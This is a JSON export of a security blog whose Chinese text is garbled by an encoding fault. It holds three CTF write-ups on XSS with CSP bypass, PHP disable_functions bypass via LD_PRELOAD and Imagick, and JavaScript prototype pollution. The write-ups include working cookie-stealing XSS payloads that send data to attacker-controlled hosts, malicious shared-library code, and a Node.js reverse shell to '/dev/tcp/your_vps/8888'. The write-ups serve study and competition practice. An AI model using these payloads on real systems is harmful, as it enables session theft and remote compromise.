{"meta":{"title":"glotozz'blog","subtitle":null,"description":null,"author":"glotozz","url":"https://glotozz.github.io","root":"/"},"pages":[{"title":"æ–‡ç« æ”¶é›†","date":"2019-09-04T14:16:42.000Z","updated":"2020-02-27T07:30:34.924Z","comments":true,"path":"read/index.html","permalink":"https://glotozz.github.io/read/index.html","excerpt":"","text":"2/27 SVG XSSçš„ä¸€ä¸ªé»‘é­”æ³• æ·±å…¥ç†è§£æµè§ˆå™¨è§£ææœºåˆ¶å’ŒXSSå‘é‡ç¼–ç  CSPç­–ç•¥åŠç»•è¿‡æ–¹æ³• 2/26 LD_PRELOAD+putenv bypass è·¨åŸŸæ–¹å¼åŠå…¶äº§ç”Ÿçš„å®‰å…¨é—®é¢˜ Python3ç¼–ç é—®é¢˜"},{"title":"å…³äºæˆ‘","date":"2019-09-04T14:16:42.000Z","updated":"2020-02-21T07:27:16.016Z","comments":true,"path":"about/index.html","permalink":"https://glotozz.github.io/about/index.html","excerpt":"","text":""}],"posts":[{"title":"XSS&bypass CSP","slug":"XSS-bypass-CSP","date":"2020-02-27T02:01:25.000Z","updated":"2020-02-27T07:49:23.503Z","comments":true,"path":"2020/02/27/XSS-bypass-CSP/","link":"","permalink":"https://glotozz.github.io/2020/02/27/XSS-bypass-CSP/","excerpt":"ä»å‡ é“é¢˜å­¦ä¹ XSSä»¥åŠä¸€äº›ç›¸å…³ç»•è¿‡å§¿åŠ¿","text":"ä»å‡ é“é¢˜å­¦ä¹ XSSä»¥åŠä¸€äº›ç›¸å…³ç»•è¿‡å§¿åŠ¿ hgame-Cosmosçš„èŠå¤©å®¤1ç¯å¢ƒå…³äº†ï¼Œyyä¸€ä¸‹å¥½äº†==ï¼ è¿‡æ»¤äº†æ‰€æœ‰é—­åˆæ ‡ç­¾scriptã€iframeç­‰ï¼šre.sub(&quot;&lt;\\/?[^&gt;]+&gt;&quot;, &quot;&quot;, message),å¹¶è½¬åŒ–ä¸ºå¤§å†™ ç”¨æµè§ˆå™¨äº‹ä»¶æ‰§è¡Œjsï¼Œä¸é—­åˆå³æ ‡ç­¾æ—¶ä¼šè‡ªåŠ¨è¡¥å…¨ payload1 123&lt;svg/onload=&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#118&amp;#112&amp;#115&amp;#45&amp;#105&amp;#112&amp;#39&amp;#43&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#41&amp;#59&amp;#47&amp;#47 ç¼–ç å†…å®¹window.open(&#39;http://vps-ip&#39;+document.cookie);// payload2 å¼•å…¥å¤–éƒ¨é¡µé¢ è¿™ä¸ªåšæ³•ä»…é™chrome 1&lt;link rel=\"import\"href=\"http://vps-ip/\" ä½†æ˜¯éœ€è¦è§£å†³è·¨åŸŸé—®é¢˜ï¼Œä½¿ç”¨flaskæˆ–è€…SimpleHTTPServerå¼€ä¸ªæœåŠ¡å³å¯ 1234567891011from flask import *app = Flask(__name__)@app.route('/')def hello_world(): response = make_response(\"&lt;script&gt;window.open('http://vps-ip/'+document.cookie)&lt;/script&gt;\") response.headers['Access-Control-Allow-Origin'] = '*' return responseif __name__ == '__main__': app.run(host=\"0.0.0.0\",port=80) æœ¬åœ°æµ‹è¯• hgame-ComcosèŠå¤©å®¤2å°†scriptæ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™ç»•è¿‡ï¼Œä½†æ˜¯å‡ºç°æŠ¥é”™ Refused to execute inline script because it violates the following ContentSecurity Policy directive: â€œscript-src â€˜selfâ€™â€. Either the â€˜unsafe-inlineâ€™keyword, a hash (â€˜sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=â€™), or anonce (â€˜nonce-â€¦â€™) is required to enable inline execution. æŸ¥çœ‹CSPç­–ç•¥ 1Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; å®ƒé™åˆ¶äº†å†…è” JS è„šæœ¬ï¼Œå¹¶ä¸”é™åˆ¶äº†å¼•å…¥çš„é™æ€èµ„æºæ–‡ä»¶åªèƒ½ä»åŒåŸŸä¸‹åŠ è½½ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œé‡åˆ°è¿™ç§CSP â¼€èˆ¬æ˜¯æ‰¾è¯¥ç«™æ˜¯å¦æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ â¼€ä¸ªå†…å®¹ä¸º alert(/xss/) çš„å›¾â½šå†å¼•ç”¨ï¼Œä¹Ÿå¯ä»¥åŒæºä¸‹æœ‰æ²¡æœ‰å¯ä»¥æ‰§è¡Œä»»æ„ JS ä»£ç çš„ evil.js æ–‡ä»¶ã€‚ æœ¬é¢˜ä¸­æœ‰â¼€ä¸ªæ¥å£ /sendï¼Œå®ƒä¼šè¿”å›è¿‡æ»¤åçš„æ¶ˆæ¯å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ 1&lt;scriscriptpt src=&quot;/send?message=alert(1)&quot;&gt;&lt;/scscriptript&gt; RealWorld CTF2019-Mission Invisibleç»™äº†æºç ï¼Œæ ¸å¿ƒæ˜¯ 123456789101112131415161718&lt;script&gt; function setElement(tag) &#123; tag = tag.substring(0, 1); var ele = document.createElement(tag) var attrs = getCookie(\"attrs\").split(\"&amp;\"); for (var i = 0; i &lt; attrs.length; i++) &#123; var key = attrs[i].split(\"=\")[0]; var value = attrs[i].split(\"=\")[1]; ele.setAttribute(key, value); &#125; document.body.appendChild(ele); &#125; var tag = getUrlParam(\"tag\"); setCookie(\"tag\", tag); setElement(tag);&lt;/script&gt; å¯ä»¥æ„é€ ä¸€ä¸ªæ ‡ç­¾å¹¶ä¸ºå…¶è®¾ç½®å±æ€§ åªèƒ½ä½¿ç”¨aã€pï¼Œä½†æ˜¯éœ€è¦ä½¿å…¶è‡ªåŠ¨è§¦å‘ï¼Œè§£å†³åŠæ³•å¦‚ä¸‹ 1&lt;p onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/p&gt; chromeæµ‹è¯•æˆåŠŸ ä¹‹åå¸¸è§„æ‰“cookieå³å¯ RealWorld CTF2019-Hcorme é¢˜ç›®æœ‰ä¸€ä¸ªcallbackçš„æ¥å£ï¼Œèƒ½å¤ŸæŠŠè¯·æ±‚å‚æ•°è¾“å‡ºï¼Œå¹¶ä¸”æ˜¯text/htmlå½¢å¼ã€‚ ä¸¤ä¸ªé™åˆ¶ï¼šXSS Auditorã€Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;; Hardoldå¸ˆå‚…çš„æ€è·¯â€”&gt;utf-16ç¼–ç ç»•è¿‡ å› ä¸ºåœ¨UTF-16æ–‡ä»¶çš„å¼€é¦–ï¼Œéƒ½ä¼šæ”¾ç½®ä¸€ä¸ªU+FEFFå­—ç¬¦ä½œä¸ºByte Order Markï¼ˆUTF-16LEä»¥FF FEä»£è¡¨ï¼ŒUTF-16BEä»¥FE FFä»£è¡¨ï¼‰ï¼Œä»¥æ˜¾ç¤ºè¿™ä¸ªæ–‡æœ¬æ–‡ä»¶æ˜¯ä»¥UTF-16ç¼–ç ï¼Œå®ƒæ˜¯ä¸ªæ²¡æœ‰å®½åº¦ä¹Ÿæ²¡æœ‰æ–­å­—çš„ç©ºç™½ã€‚ çŒœæµ‹æ˜¯ç±»ä¼¼æˆªæ–­çš„åŸç†ï¼Œä»è€Œbypass XSS Auditor ç»•è¿‡CSPï¼Œæ˜¯åˆ©ç”¨JSONPç›´æ¥æŠŠjsä»£ç æŒ‚è½½åˆ°æœ¬åœ°çš„script ä¼šè¿›è¡Œä¸¤æ¬¡èµ„æºè¯·æ±‚ï¼Œç¬¬äºŒæ¬¡çš„èµ„æºç±»å‹æ˜¯script 1print(quote((&apos;&lt;script/src=?callback=alert(1)&gt;&lt;/script&gt;&apos;).encode(&apos;utf-16&apos;))) CODEGATE 2020 CSPç»•è¿‡å‰é¢æ˜¯ä¸€ä¸ªç®€å•çš„æ­£åˆ™ç»•è¿‡ï¼Œå‘ç°å­˜åœ¨CSP script-src &#39;none&#39; view.phpæäº¤åˆ°api.phpï¼Œæ ¼å¼ä¸ºname/p1/p2ï¼Œå¯ä»¥è®¾ç½®header è§£å†³åŠæ³•ï¼š*httpçŠ¶æ€ç ç½®ä¸º102æ—¶ï¼ŒCSPä¸ä¼šæ‰§è¡Œ * é¢–å¥‡å¸ˆå‚…çš„payload 12345678910#author: é¢–å¥‡L'Amore#www.gem-love.comimport base64csp1 = str(base64.b64encode(b'header') ,encoding = \"utf8\")csp2 = str(base64.b64encode(b'HTTP/1.1'),encoding = \"utf8\")csp3 = str(base64.b64encode(b'102'),encoding = \"utf8\")name = str(base64.b64encode(b'body'),encoding = \"utf8\")xss = str(base64.b64encode(b'&lt;script\\n&gt;window.open(\"http://gem-love.com:12345/?\"+document.cookie);&lt;/script\\n&gt;'),encoding = \"utf8\")p3 = \"MQ==\" #p3 is uselessprint('|&#123;&#125;,&#123;&#125;,&#123;&#125;|&#123;&#125;,&#123;&#125;,&#123;&#125;'.format(csp1,csp2,csp3,name,xss,p3)) 0ctf2018-h4xors.club2å‘ç°çœ‹ä¸æ‡‚==ï¼ä»¥åå†æ¥è¡¥ æœ€åç»™ä¸ªåˆ†äº«ä¸ªé“¾æ¥ï¼Œé‡åˆ°é—®é¢˜å¯ä»¥æŸ¥ä¸€æŸ¥ï¼šCSPç­–ç•¥åŠç»•è¿‡æ–¹æ³• å‚è€ƒé“¾æ¥ï¼š https://www.anquanke.com/post/id/186707 https://github.com/vidar-team/Hgame2020_writeup/ https://www.gem-love.com/ctf/1329.html#CSP http://www.wupco.cn/?p=4408","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"https://glotozz.github.io/tags/xss/"}]},{"title":"ä»ä¸€é“é¢˜å­¦ä¹ bypass disable_func","slug":"ä»ä¸€é“é¢˜å­¦ä¹ bypass-disable-func","date":"2020-02-26T00:07:29.000Z","updated":"2020-02-26T07:56:35.003Z","comments":true,"path":"2020/02/26/ä»ä¸€é“é¢˜å­¦ä¹ bypass-disable-func/","link":"","permalink":"https://glotozz.github.io/2020/02/26/ä»ä¸€é“é¢˜å­¦ä¹ bypass-disable-func/","excerpt":"","text":"ctfå’Œæ¸—é€ç»å¸¸ä¼šé‡åˆ°éœ€è¦bypass disable_funcï¼Œå€Ÿä¸‹é¢è¿™é“é¢˜å­¦ä¹ ä¸‹åŸç† TCTF wallbreaker easy å¾ˆæ˜æ˜¾ï¼Œç»™äº†æˆ‘ä»¬ä¸€ä¸ªåé—¨ï¼Œæç¤ºéœ€è¦ç”¨Imagickæ¥ç»•è¿‡disable_functionï¼Œè®¾ç½®äº†open_basedirï¼Œå…ˆçœ‹çœ‹phpinfo() å¯¹æ¯”ç¦ç”¨åˆ—è¡¨ 1dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link =================åˆ†å‰²çº¿ åŠ ä¸ªerror_log 1dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link,error_log =================åˆ†å‰²çº¿ å‡½æ•°å¯¹åº”çš„åˆ©ç”¨ç‚¹ 1234567å¸¸è§„ç»•è¿‡: execã€shell_execã€systemã€passthruã€popenã€proc_openld_preloadç»•è¿‡: mailã€imap_mailã€error_logã€mb_send_mailpcntl_execimap_openfastcgicomapache mod-cgi è¿˜å­˜åœ¨ä¸‹é¢5ä¸ª 12345dlimap_mailputenvini_setapache_setenv é‚£ä¹ˆå°±å¯¹è¿™ä¸ª5ä¸ªä¸€ä¸€åˆ†æ ä¸€ã€dl()-æ‹“å±•åº“ç»•è¿‡ å®ç°æ–¹æ³•å‚è€ƒï¼šhttps://cloud.tencent.com/developer/article/1141142 ç‰ˆæœ¬ è¯´æ˜ 7.0.0 PHP-FPM æ¨¡å¼ä¸‹å·²ç¦ç”¨ dl()ã€‚ 5.3.9 å°½ç®¡ä¸æ¨èï¼Œä½† PHP-FPM æ¨¡å¼ä¸‹å¯ç”¨äº† dl()ã€‚ 5.3.0 ç”±äºç¨³å®šæ€§ï¼Œdl() åœ¨æŸäº› SAPI ä¸­è¢«ç¦ç”¨ã€‚ä»…ä»…å…è®¸ dl() çš„ SAPI ä¸º CLI å’Œ Embedã€‚ ä½¿ç”¨ æ‰©å±•åŠ è½½æŒ‡ä»¤ ä½œä¸ºæ›¿ä»£ã€‚ SAPIï¼ˆServer Application Programming Interfaceï¼‰æœåŠ¡å™¨åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼Œå³PHPä¸å…¶ä»–åº”ç”¨äº¤äº’çš„æ¥å£ï¼ŒPHPè„šæœ¬è¦æ‰§è¡Œæœ‰å¾ˆå¤šæ–¹å¼ï¼Œé€šè¿‡WebæœåŠ¡å™¨ï¼Œæˆ–è€…ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸‹ï¼Œä¹Ÿå¯ä»¥åµŒå…¥åœ¨å…¶ä»–ç¨‹åºä¸­ã€‚ SAPIæä¾›äº†ä¸€ä¸ªå’Œå¤–éƒ¨é€šä¿¡çš„æ¥å£ï¼Œå¸¸è§çš„SAPIæœ‰ï¼šcgiã€fast-cgiã€cliã€apacheæ¨¡å—çš„DLLã€isapi 1Server API FPM/FastCGI è¿™é‡Œæœªå¼€å¯dlï¼Œé‚ä½œç½¢ äºŒã€imap_mail() https://www.exploit-db.com/exploits/35146 é€‚ç”¨äºPHP &lt; 5.6.2çš„ï¼Œé‚ä½œç½¢ ä¸‰ã€putenv() putenv()å¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡ 1putenv ( string $setting ) : bool æ·»åŠ  setting åˆ°æœåŠ¡å™¨ç¯å¢ƒå˜é‡ã€‚ ç¯å¢ƒå˜é‡ä»…å­˜æ´»äºå½“å‰è¯·æ±‚æœŸé—´ã€‚ åœ¨è¯·æ±‚ç»“æŸæ—¶ç¯å¢ƒä¼šæ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚ ä¸»è¦æ˜¯å’ŒLD_PRELOADæ‰“ä¸€å¥—ç»„åˆæ‹³ LD_PRELOADè¿™ä¸ªç¯å¢ƒå˜é‡æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ï¼Œä¼šåœ¨å…¶ä»–æ–‡ä»¶è¢«è°ƒç”¨å‰ï¼Œæœ€å…ˆè¢«è°ƒç”¨ 1.åˆ¶ä½œä¸€ä¸ªæ¶æ„shared libraries2.ä½¿ç”¨putenvè®¾ç½®LD_PRELOADä¸ºæ¶æ„æ–‡ä»¶è·¯å¾„3.ä½¿ç”¨æŸä¸ªphpå‡½æ•°ï¼Œè§¦å‘specific shared library4.æˆåŠŸè¿›è¡ŒRCE å¯»æ‰¾ä¸€ä¸ªèƒ½è§¦å‘è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„phpå‡½æ•° æœ€å¸¸è§çš„æ˜¯mail() 123&lt;?php mail(&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;);?&gt; straceä¸€ä¸‹ 1strace -f -e execve php a.php å¾—åˆ° æŸ¥çœ‹ç¨‹åºå¯èƒ½è°ƒç”¨çš„ç³»ç»ŸAPI 1readelf -Ws /usr/sbin/sendmail æœ‰å¾ˆå¤šå‡½æ•°å¯ä»¥ä½¿ç”¨ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©geteuid() hack.c 123456789101112#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123; system(&quot;ls / &gt; /tmp/sky&quot;);&#125;int geteuid() &#123; if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125; unsetenv(&quot;LD_PRELOAD&quot;); payload();&#125; è¿™é‡Œè¦ç”Ÿæˆ shared libraries 12gcc -c -fPIC hack.c -o hackgcc --share hack -o hack.so ä¿®æ”¹a.php 1234&lt;?php putenv(&quot;LD_PRELOAD=./hack.so&quot;); mail(&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;);?&gt; è¿è¡Œä¸‹ï¼Œå‘ç°/tmpä¸‹ç”Ÿæˆäº†æ¶æ„æ–‡ä»¶ï¼ŒæŸ¥çœ‹ è¿›é˜¶ å³ä½¿æ²¡æœ‰å®‰è£…sendmailä¹Ÿå¯ä»¥RCEï¼Œåˆ é™¤sendmailå¹¶ä¿®æ”¹hack1.c 123456789#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;ls&quot;);&#125; æ‰€ä»¥å½“æˆ‘ä»¬æœ€å¼€å§‹å°†evil shared library loadä¸Šåï¼Œå°±ä¼šè§¦å‘__attribute__ ((__constructor__)) ï¼Œå³ä½¿åé¢å‡ºç°No such file or dicectory æœ¬é¢˜ä¸­mail()è¢«disable_funcé™åˆ¶ï¼Œæç¤ºphp-imagickæ‰©å±• æºç ï¼šhttps://github.com/ImageMagick/ImageMagick å› ä¸ºçŸ¥é“è¦è°ƒç”¨ffmpegï¼Œgithubæœç´¢å³å¯ Makefile.nt æœç´¢mpeg è¿™é‡Œå¯ä»¥WMVä¸ºä¾‹ a.php 123&lt;?php $img = new Imagick(&apos;sky.wmv&apos;);?&gt; ä¹‹åå°±æ˜¯å’Œä¸Šé¢ç±»ä¼¼çš„æŸ¥çœ‹æ˜¯å¦è°ƒç”¨ æ³¨æ„çš„æ˜¯wmvæ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œå¦åˆ™æ— æ³•è°ƒç”¨ffmpeg hack1.c 123456789#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;/readflag &gt; /tmp/d4dabdbc73b87e364e29e60c60a92900/flag&quot;);&#125; 12gcc -c -fPIC hack1.c -o skygcc --share sky -o sky.so æœ¬é¢˜ä¸­ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªsky.soå’Œ1.wmvåˆ°/tmp/sandboxä¸‹ æ‰§è¡Œ 12putenv(&quot;LD_PRELOAD=/tmp/bd24f8b02aaf295daa247018d620ffe4/sky.so&quot;);$img = new Imagick(&apos;/tmp/bd24f8b02aaf295daa247018d620ffe4/1.wmv&apos;); å…¶ä»–è§£æ³•ï¼š ä¸€ã€è¦†ç›–delegate.xml å› ä¸ºæˆ‘ä»¬è¦æ‰§è¡Œ/readflagï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯é€šè¿‡ç³»ç»Ÿå‘½ä»¤ï¼Œé‚£ä¹ˆæ—¢ç„¶delagate.xmlé‡Œé¢èƒ½å¤Ÿè‡ªå®šä¹‰è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™delegateæ¥è®©imagickå½“å¤„ç†æŸä¸ªæ–‡ä»¶åç¼€æ—¶åŠ è½½æˆ‘ä»¬çš„delegate.xmlï¼Œç„¶åæ‰§è¡Œæˆ‘ä»¬çš„commandå³å¯ã€‚ 123&lt;delegatemap&gt; &lt;delegate decode=&quot;ps:alpha&quot; command=&quot;sh -c &amp;quot;/readflag &gt; /tmp/3accb9900a8be5421641fb31e6861f33/flag.txt&amp;quot;&quot;/&gt;&lt;/delegatemap&gt; å†æ‰§è¡Œ 12putenv(&apos;MAGICK_CONFIGURE_PATH=/tmp/3accb9900a8be5421641fb31e6861f33&apos;);$img = new Imagick(&apos;/tmp/3accb9900a8be5421641fb31e6861f33/1.ept&apos;); äºŒã€è¦†ç›–å­è¿›ç¨‹ æ¯”ä¸Šä¸€ç§æ›´åŠ æ·±å…¥ä¸€å±‚ åœ¨delegate.xmlå®šä¹‰ä¸­åœ¨decode eptæ–‡ä»¶æ—¶ä¼šè°ƒç”¨gsï¼Œåªè¦æŒ‡å®špathä¸ºæˆ‘ä»¬çš„gsçš„æ–‡ä»¶å¤¹è·¯å¾„å³å¯è¾¾æˆåŠ«æŒçš„æ•ˆæœã€‚ gs.c 12345678#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main() &#123; unsetenv(&quot;PATH&quot;); const char* cmd = getenv(&quot;CMD&quot;); system(cmd); return 0;&#125; ç¼–è¯‘åå‘½åä¸ºgså³å¯ï¼Œå†ä¸Šä¼ ä¸ª1.ept 1234putenv(&apos;PATH=/tmp/3accb9900a8be5421641fb31e6861f33&apos;);putenv(&apos;CMD=/readflag &gt; /tmp/3accb9900a8be5421641fb31e6861f33/flag.txt&apos;);chmod(&apos;/tmp/3accb9900a8be5421641fb31e6861f33/gs&apos;,&apos;0777&apos;);$img = new Imagick(&apos;/tmp/3accb9900a8be5421641fb31e6861f33/1.ept&apos;); ä¸‰ï¼šåˆ©ç”¨ error_log å‡½æ•°å¯åŠ¨ sendmail è¿™é‡Œæˆ‘ä»¬è¦ç”¨åˆ°çš„å°±æ˜¯å½“ error_log çš„ç¬¬äºŒä¸ªå‚æ•° message_type çš„å€¼ä¸º 1 çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨mail å‡½æ•°çš„åŒä¸€ä¸ªå†…ç½®å‡½æ•°(ä¼šæ‰§è¡Œsendmail å‘½ä»¤)çš„ç‰¹æ€§ã€‚ åªéœ€è¦å°†ç¬¬ä¸€ä¸ªmail()ä¾‹å­çš„hack.cä¿®æ”¹æˆå¦‚ä¸‹å³å¯ 1234&lt;?php putenv(&quot;LD_PRELOAD=./hack.so&quot;); error_log(&apos;&apos;,1);?&gt; å››ã€ini_set() å¯ä»¥ç”¨æ¥ç»•è¿‡open_basedir 1chdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);echo(file_get_contents(&apos;flag&apos;)); äº”ã€apache_setenv apache_setenv â€” è®¾ç½® Apache å­è¿›ç¨‹ç¯å¢ƒå˜é‡ å½“è®¾ç½®äº†æŸ Apache ç¯å¢ƒå˜é‡, ç›¸åº”çš„ $_SERVER å˜é‡ä¸ä¼šæ”¹å˜ã€‚ æœäº†ä¸‹å¥½åƒæ²¡æœ‰ç›´æ¥ç›¸å…³çš„æ¼æ´==ï¼ æœ€åæ”¾ä¸Šä¸¤ä¸ªå¸¸ç”¨çš„bypassé“¾æ¥ some exploits in php7 bypass disable_functions via LD_PRELOAD å‚è€ƒé“¾æ¥ï¼š https://github.com/l3m0n/Bypass_Disable_functions_Shell https://www.cnblogs.com/tr1ple/p/11279895.html#Bjhbm2Rh https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/#%E5%90%8E%E8%AE%B0","categories":[],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://glotozz.github.io/tags/bypass/"}]},{"title":"JavaScriptåŸå‹é“¾æ±¡æŸ“","slug":"JavaScriptåŸå‹é“¾æ±¡æŸ“","date":"2020-02-25T02:51:11.000Z","updated":"2020-02-27T07:10:00.247Z","comments":true,"path":"2020/02/25/JavaScriptåŸå‹é“¾æ±¡æŸ“/","link":"","permalink":"https://glotozz.github.io/2020/02/25/JavaScriptåŸå‹é“¾æ±¡æŸ“/","excerpt":"","text":"è¿™æ¬¡å…¬ç›Šèµ›è€ƒåˆ°äº†JavaScriptåŸå‹é“¾æ±¡æŸ“ï¼Œä¹‹å‰çœ‹çš„æ–‡ç« éƒ½æ˜¯çº¸ä¸Šè°ˆå…µï¼ŒèŠ±ç‚¹æ—¶é—´æ¥å­¦ä¹ è®°å½•ä¸‹ã€‚ åŸå‹ 123function A(name)&#123; this.name = &apos;a&apos;;&#125; åœ¨javascriptä¸­,æ¯ä¸ªå¯¹è±¡çš„éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘ä»–çš„åŸå‹(prototype)çš„å†…éƒ¨é“¾æ¥ï¼Œè¿™ä¸ªåŸå‹å¯¹è±¡åˆæœ‰å®ƒè‡ªå·±çš„åŸå‹ï¼Œç›´åˆ°nullä¸ºæ­¢ åœ¨javascriptä¸­ä¸€åˆ‡çš†å¯¹è±¡ï¼Œå› ä¸ºæ‰€æœ‰çš„å˜é‡ï¼Œå‡½æ•°ï¼Œæ•°ç»„ï¼Œå¯¹è±¡ éƒ½å§‹äºobjectçš„åŸå‹å³object.prototypeã€‚åŒæ—¶ï¼Œåœ¨jsä¸­åªæœ‰ç±»æ‰æœ‰prototypeå±æ€§ï¼Œè€Œå¯¹è±¡å´æ²¡æœ‰ï¼Œå¯¹è±¡æœ‰çš„æ˜¯__proto__å’Œç±»çš„prototypeå¯¹åº”ã€‚ ä¸”äºŒè€…æ˜¯ç­‰ä»·çš„ ç±» æ•°ç»„ ä¸Šé¢å°±æ˜¯ä¸¤æ¡å®Œæ•´çš„åŸå‹é“¾ï¼Œéƒ½ä¼šæŒ‡å‘objectï¼Œå†æŒ‡å‘null å†ä¸¾ä¸ªåŸå‹é“¾æœç´¢çš„ä¾‹å­ 1234567function y()&#123; this.a = &apos;a&apos;; this.b = &apos;b&apos;;&#125;j = new y;y.prototype.c = &apos;c&apos;;console.log(j.c) è¿™ä¸ªä¾‹å­ä¸­å…ˆnewäº†ä¸€ä¸ªå¯¹è±¡jï¼Œä¹‹åå†yä¸­æ·»åŠ cï¼Œä½†æ˜¯ä»ç„¶æ‰“å°å‡ºäº†c å½“è¦ä½¿ç”¨æˆ–è¾“å‡ºä¸€ä¸ªå˜é‡æ—¶ï¼šé¦–å…ˆä¼šåœ¨æœ¬å±‚ä¸­æœç´¢ç›¸åº”çš„å˜é‡ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šå‘ä¸Šæœç´¢ï¼Œå³åœ¨è‡ªå·±çš„çˆ¶ç±»ä¸­æœç´¢ï¼Œå½“çˆ¶ç±»ä¸­ä¹Ÿæ²¡æœ‰æ—¶ï¼Œå°±ä¼šå‘ç¥–çˆ¶ç±»æœç´¢ï¼Œç›´åˆ°æŒ‡å‘nullï¼Œå¦‚æœæ­¤æ—¶è¿˜æ²¡æœ‰æœç´¢åˆ°ï¼Œå°±ä¼šè¿”å› undefined å†ä¸¾ä¸ªåŸå‹é“¾æ±¡æŸ“çš„ä¾‹å­ 123456a = &#123;&apos;b&apos;:1&#125;console.log(a.b)a.__proto__.b = 2console.log(a.b)c = &#123;&#125;console.log(c.b) ä¿®æ”¹açš„åŸå‹å³Objectçš„å±æ€§b=2ï¼Œç¬¬ä¸€æ¬¡æ‰“å°a.bæ ¹æ®æœç´¢é¡ºåºä¸ºb=1ï¼Œä¹‹ånewäº†ä¸€ä¸ªå­—å…¸å¯¹è±¡å³Objectï¼Œå› æ­¤å±æ€§b=2 å†ä¸¾ä¸ªåŸå‹é“¾æ±¡æŸ“è§¦å‘çš„ä¾‹å­ 1234567891011121314151617function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125;let o1 = &#123;&#125;;let o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;;merge(o1,o2);console.log(o1.a,o1.b);o3 = &#123;&#125;;console.log(o3.b); å½“keyä¸º__proto__å³å¯åŸå‹é“¾æ±¡æŸ“ ç†è®ºä¸Šæ‰§è¡Œï¼šo1.a = 1 o1.__proto__.b = 2 è¾“å‡ºåº”è¯¥æ˜¯1ï¼Œ2 å’Œ 2 æ‰§è¡Œä¸€ä¸‹ åŸå› æ˜¯è¿™é‡Œo2 = {a:1,&quot;__proto__&quot;:{b:2}};æ˜¯ç»™o2çš„åŸå‹èµ‹å€¼å±æ€§b=2ï¼Œç›¸å½“äº o2 = {a:1,b:2} è§£å†³è¿™ä¸ªé—®é¢˜éœ€è¦ä½¿__proto__ä½œä¸ºé”®å o2 = JSON.parse(&#39;{&quot;a&quot;:1,&quot;__proto__&quot;:{&quot;b&quot;:2}}&#39;) Nodejsçš„RCE è°ƒç”¨child_processæ¨¡å—æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 12global.process.mainModule.require(&apos;child_process&apos;).exec(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/your_vps/8888 0&gt;&amp;1&quot;&apos;)global.process.mainModule.constructor._load(&apos;child_process&apos;).exec(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/your_vps/8888 0&gt;&amp;1&quot;&apos;) åˆ©ç”¨æ–¹å¼ä¸€èˆ¬æ˜¯objectçš„æŸä¸ªå±æ€§ä¸ºä¸Šé¢çš„æ¨¡å—å¹¶è¢«è°ƒç”¨ ä¸Šé¢éƒ½æ˜¯åŸç†ï¼Œä¸‹é¢åˆ†æå‡ é“é¢˜ å…¬ç›Šèµ›Ez epress registeréœ€è¦æ»¡è¶³å°å†™ä¸ç­‰äºadminï¼Œä¹‹åtoUpperCase()å­˜å…¥sessionï¼Œå†ä¸ADMINæ¯”è¾ƒ javascriptå¤§å°å†™ç‰¹æ€§ç»•è¿‡ï¼š https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html 